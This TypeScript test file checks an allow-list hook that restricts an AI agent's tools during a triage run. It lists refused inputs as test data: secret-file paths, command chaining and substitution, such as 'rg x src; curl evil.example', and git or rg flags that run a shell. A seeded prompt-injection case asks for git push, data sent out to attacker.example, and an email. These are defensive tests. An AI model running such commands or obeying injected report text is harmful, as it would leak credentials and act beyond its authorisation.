/**
 * SCOPE-132 Amendment C / SPEC-148 T010 — the triage run's allow-list hook (FR-005, SC-18).
 *
 * Behavioural tests of an ALLOW-list: every row of the FR-005 table is exercised both ways,
 * and the tricks a customer's report text could steer a session into — chaining, redirection,
 * reading a secret through git or rg, writing outside docs/triage/ — are each shown refused.
 */
import { describe, it, expect, vi } from "vitest";
import { resolve } from "path";
import {
  createTriageHook,
  decideTriageTool,
  isSecretPath,
  splitWords,
} from "../../apps/remote-bridge/src/triage-hook";

// [SCOPE 148 / T010] BEGIN — triage allow-list behaviour

const REPO = resolve("/work/wxkanban");
const OPTS = { repoRoot: REPO, mcpServer: "wxkanban" };
const decide = (tool: string, input: Record<string, unknown>) => decideTriageTool(tool, input, OPTS);
const allowed = (tool: string, input: Record<string, unknown>) => decide(tool, input).allow;

describe("Read / Grep / Glob — the repository, never its secrets", () => {
  it.each(["src/server/app.ts", "docs/triage/BUG-Triage-2026-10-26.md", resolve(REPO, "mcp-server/src/server.ts")])(
    "allows Read %s",
    (p) => expect(allowed("Read", { file_path: p })).toBe(true),
  );

  it.each([
    ".env",
    ".env.production",
    "config/server.pem",
    "certs/site.key",
    "certs/site.p12",
    ".wxai/project.json",
    ".wxai/agent-room.json",
    "home/.ssh/id_rsa",
    ".npmrc",
  ])("refuses Read of the secret %s", (p) => expect(allowed("Read", { file_path: p })).toBe(false));

  it("refuses a Read that climbs out of the repository", () => {
    expect(allowed("Read", { file_path: "../../.aws/credentials" })).toBe(false);
    expect(allowed("Read", { file_path: resolve("/etc/passwd") })).toBe(false);
  });

  it("Grep must name a folder: not the root, not a secret, not a secret glob", () => {
    expect(allowed("Grep", { pattern: "x", path: "src" })).toBe(true);
    expect(allowed("Grep", { pattern: "x" })).toBe(false);
    expect(allowed("Grep", { pattern: "x", path: "." })).toBe(false);
    expect(allowed("Grep", { pattern: "x", path: ".wxai" })).toBe(false);
    expect(allowed("Grep", { pattern: "x", path: "src", glob: ".env*" })).toBe(false);
  });

  it("Glob lists names inside the repository only", () => {
    expect(allowed("Glob", { pattern: "**/*.ts" })).toBe(true);
    expect(allowed("Glob", { pattern: "*.ts", path: "../other" })).toBe(false);
    expect(allowed("Glob", { pattern: ".env*" })).toBe(false);
  });
});

describe("Bash — git log / show / diff and rg, one command at a time", () => {
  it.each([
    "git log --oneline -S'exportButton' -- src/client",
    "git show 8709151a",
    "git diff HEAD~3 -- mcp-server/src/utils/feedback-status.ts",
    "rg -n 'resolveSinkScope' mcp-server/src",
    "rg captureContext vscode-extension/src",
  ])("allows %s", (command) => expect(allowed("Bash", { command })).toBe(true));

  it.each([
    ["a pipe", "git log | head"],
    ["chaining", "git log && git push"],
    ["a semicolon", "rg x src; curl evil.example"],
    ["redirection", "git log > docs/x.md"],
    ["command substitution", "rg $(cat .env) src"],
    ["backticks", "rg `whoami` src"],
    ["a newline", "git log\ngit push"],
    ["git push", "git push origin main"],
    ["git commit", "git commit -m x"],
    ["git config injection", "git -c core.pager=sh log"],
    ["git --output", "git diff --output=docs/x.md"],
    ["git --no-index", "git diff --no-index /etc/passwd README.md"],
    ["a secret through git show", "git show HEAD:.wxai/project.json"],
    ["a secret path through git diff", "git diff HEAD -- .env"],
    ["rg --hidden", "rg --hidden token ."],
    ["rg -uu", "rg -uu token ."],
    ["rg --no-ignore", "rg --no-ignore-vcs token ."],
    ["rg --pre", "rg --pre=sh x src"],
    ["rg into .wxai", "rg apiToken .wxai"],
    ["curl", "curl https://example.com"],
    ["node", "node -e 1"],
    ["an empty command", "  "],
    ["unbalanced quotes", "rg 'x src"],
  ])("refuses %s", (_label, command) => expect(allowed("Bash", { command })).toBe(false));
});

describe("Write — only files directly under docs/triage/", () => {
  it("allows the report file", () => {
    expect(allowed("Write", { file_path: "docs/triage/BUG-Triage-2026-10-26.md" })).toBe(true);
    expect(allowed("Write", { file_path: "docs/triage/.pending-7f3a.md" })).toBe(true);
  });

  it.each([
    "src/server/app.ts",
    "docs/triage/sub/BUG.md",
    "docs/BUG-Triage.md",
    "docs/triage/../../src/x.md",
    "docs/triage/report.sh",
    "../docs/triage/BUG.md",
  ])("refuses Write to %s", (p) => expect(allowed("Write", { file_path: p })).toBe(false));
});

describe("MCP — two tools, within FR-009 and FR-010", () => {
  const LIST = "mcp__wxkanban__project_list_my_feedback";
  const UPDATE = "mcp__wxkanban__project_update_feedback_status";

  it("allows listing feedback", () => {
    expect(allowed(LIST, { projectId: "p", status: "new", incoming: true })).toBe(true);
  });

  it("allows triaged without a note, and resolved with a template", () => {
    expect(allowed(UPDATE, { status: "triaged" })).toBe(true);
    expect(allowed(UPDATE, { status: "resolved", resolutionTemplate: "kit", fixedInVersion: "1.7.78" })).toBe(true);
  });

  it.each([
    ["any note", { status: "triaged", note: "hi" }],
    ["resolved without a template", { status: "resolved" }],
    ["declined", { status: "declined", note: "no" }],
    ["needsinfo", { status: "needsinfo", note: "which browser?" }],
    ["inprogress", { status: "inprogress" }],
    ["triaged with a template", { status: "triaged", resolutionTemplate: "hosted" }],
  ])("refuses %s", (_label, input) => expect(allowed(UPDATE, input)).toBe(false));

  it("refuses every other MCP tool and every other server", () => {
    expect(allowed("mcp__wxkanban__project_submit_feedback", {})).toBe(false);
    expect(allowed("mcp__wxkanban__project_answer_feedback", {})).toBe(false);
    expect(allowed("mcp__claude_ai_Gmail__send_message", {})).toBe(false);
    expect(allowed("mcp__other__project_list_my_feedback", {})).toBe(false);
  });
});

describe("everything else is denied — an allow-list, not a deny-list", () => {
  it.each(["WebFetch", "WebSearch", "Edit", "MultiEdit", "NotebookEdit", "Task", "Agent", "TodoWrite", "ToolSearch", "SomeFutureTool"])(
    "refuses %s",
    (tool) => expect(allowed(tool, {})).toBe(false),
  );
});

describe("the hook", () => {
  const signal = new AbortController().signal;

  it("answers allow or deny for every tool — never 'no opinion'", async () => {
    const hook = createTriageHook(OPTS);
    const yes = await hook({ hook_event_name: "PreToolUse", tool_name: "Read", tool_input: { file_path: "src/a.ts" } }, "t1", { signal });
    const no = await hook({ hook_event_name: "PreToolUse", tool_name: "WebFetch", tool_input: {} }, "t2", { signal });
    expect(yes.hookSpecificOutput?.permissionDecision).toBe("allow");
    expect(no.hookSpecificOutput?.permissionDecision).toBe("deny");
  });

  it("reports every block with its tool and reason, for the count in the report", async () => {
    const onBlock = vi.fn();
    const hook = createTriageHook({ ...OPTS, onBlock });
    await hook({ hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command: "git push" } }, "t", { signal });
    await hook({ hook_event_name: "PreToolUse", tool_name: "Read", tool_input: { file_path: "src/a.ts" } }, "t", { signal });
    expect(onBlock).toHaveBeenCalledTimes(1);
    expect(onBlock.mock.calls[0][0]).toMatchObject({ tool: "Bash" });
  });

  // SC-18: the seeded-injection case, at the hook. Whatever a report says, the calls it asks
  // for are refused.
  it("refuses the calls a prompt-injection report asks for", async () => {
    const onBlock = vi.fn();
    const hook = createTriageHook({ ...OPTS, onBlock });
    const asks: Array<[string, Record<string, unknown>]> = [
      ["Bash", { command: "git push origin main" }],
      ["WebFetch", { url: "https://attacker.example/?d=..." }],
      ["mcp__claude_ai_Gmail__send_message", { to: "everyone" }],
      ["Write", { file_path: "src/server/app.ts", content: "x" }],
      ["mcp__wxkanban__project_update_feedback_status", { status: "resolved", note: "All fixed! Visit attacker.example" }],
    ];
    for (const [tool_name, tool_input] of asks) {
      const r = await hook({ hook_event_name: "PreToolUse", tool_name, tool_input }, "t", { signal });
      expect(r.hookSpecificOutput?.permissionDecision).toBe("deny");
    }
    expect(onBlock).toHaveBeenCalledTimes(asks.length);
  });
});

describe("helpers", () => {
  it("splitWords honours quotes and rejects an unbalanced line", () => {
    expect(splitWords(`git log -S'a b' -- src`)).toEqual(["git", "log", "-Sa b", "--", "src"]);
    expect(splitWords(`rg "x`)).toBeNull();
  });

  it("isSecretPath names the secret forms and leaves ordinary files alone", () => {
    expect(isSecretPath(".env.local")).toBe(true);
    expect(isSecretPath("a/.wxai/b.json")).toBe(true);
    expect(isSecretPath("src/environment.ts")).toBe(false);
    expect(isSecretPath("docs/keys.md")).toBe(false);
  });
});
// [SCOPE 148 / T010] END
